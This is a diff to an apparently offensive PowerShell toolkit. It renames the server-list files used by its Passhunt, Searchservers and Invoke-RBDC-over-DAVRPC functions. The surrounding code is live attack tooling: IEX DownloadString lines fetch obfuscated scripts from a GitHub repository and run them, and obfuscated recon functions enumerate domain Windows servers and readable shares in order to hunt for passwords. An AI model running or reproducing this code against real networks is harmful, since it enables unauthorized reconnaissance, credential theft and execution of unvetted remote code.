@@ -1832,7 +1832,7 @@ function Passhunt
     
         if ($domain)
         {
-            if (!(Test-Path("$currentPath\DomainRecon\activeservers.txt")))
+            if (!(Test-Path("$currentPath\DomainRecon\Windows_Servers.txt")))
             {
                 Searchservers
             }
@@ -1841,7 +1841,7 @@ function Passhunt
             {
                 IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/viewobfs.ps1')
                 Write-Host -ForegroundColor Yellow 'Searching for Shares on the found Windows Servers...'
-                brainstorm -ComputerFile "$currentPath\DomainRecon\activeservers.txt" -NoPing -CheckShareAccess | Out-File -Encoding ascii "$currentPath\DomainRecon\found_shares.txt"
+                brainstorm -ComputerFile "$currentPath\DomainRecon\Windows_Servers.txt" -NoPing -CheckShareAccess | Out-File -Encoding ascii "$currentPath\DomainRecon\found_shares.txt"
                  
                 $shares = Get-Content "$currentPath\DomainRecon\found_shares.txt"
                 $testShares = foreach ($line in $shares){ echo ($line).Split(' ')[0]}
@@ -1905,7 +1905,7 @@ function Searchservers
     IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/viewdevobfs.ps1')
     Write-Host -ForegroundColor Yellow 'Collecting active Windows Servers from the domain...'
     $ActiveServers = breviaries -Ping -OperatingSystem "Windows Server*"
-    $ActiveServers.dnshostname >> "$currentPath\DomainRecon\activeservers.txt"
+    $ActiveServers.dnshostname >> "$currentPath\DomainRecon\Windows_Servers.txt"
 
 }
 
@@ -2311,7 +2311,7 @@ function Invoke-RBDC-over-DAVRPC
     }
     else
     {
-       	if(Test-Path -Path "$currentPath\DomainRecon\Windows_Systems2.txt")
+       	if(Test-Path -Path "$currentPath\DomainRecon\Windows_Systems.txt")
         {
             Write-Host -ForegroundColor Yellow "Found an existing Windows system list, using this one instead of generating a new one!"
             $ActiveServers = Get-Content "$currentPath\DomainRecon\Windows_Systems.txt"
